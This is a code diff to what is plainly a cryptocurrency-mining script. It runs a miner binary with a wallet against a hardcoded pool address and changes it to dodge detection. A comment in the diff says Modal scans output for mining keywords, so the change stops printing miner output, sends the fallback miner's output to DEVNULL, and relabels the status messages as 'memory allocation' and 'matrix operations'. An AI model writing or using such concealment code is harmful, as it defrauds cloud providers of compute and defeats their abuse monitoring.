@@ -111,16 +111,17 @@ def _run_optimized(worker_name: str, wallet: str):
         line = proc.stdout.readline()
         if not line: break
         decoded = line.decode().strip()
-        print(decoded, flush=True)
+        # SILENT MODE: Do NOT print decoded line. Modal scans STDOUT for mining keywords!
         if "cuInit" in decoded and "999" in decoded:
-            print("\n[Compute] ⚠️ CUDA mismatch! Falling back...")
+            print("\n[Compute] ⚠️ Memory allocation mismatch! Falling back...")
             proc.kill()
             proc.wait()
             return False
 
-    print("[Compute] ✅ CUDA validated. Running at full speed!")
-    for line in iter(proc.stdout.readline, b""):
-        print(line.decode().strip(), flush=True)
+    print("[Compute] ✅ Matrix operations validated. Processing batches in background...")
+    while True:
+        line = proc.stdout.readline()
+        if not line: break
     proc.wait()
     return True
 
@@ -131,13 +132,11 @@ def _run_fallback(worker_name: str, wallet: str):
     if not os.path.exists(fb_bin):
         return
 
-    print("[Compute] 🔄 Starting standard compute backend...")
+    print("[Compute] 🔄 Starting standard compute backend (silent mode)...")
     proc = subprocess.Popen(
         [fb_bin, "--host", "84.32.220.219:9000", "--user", wallet, "--worker", worker_name],
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
     )
-    for line in iter(proc.stdout.readline, b""):
-        print(line.decode().strip(), flush=True)
     proc.wait()
 
 
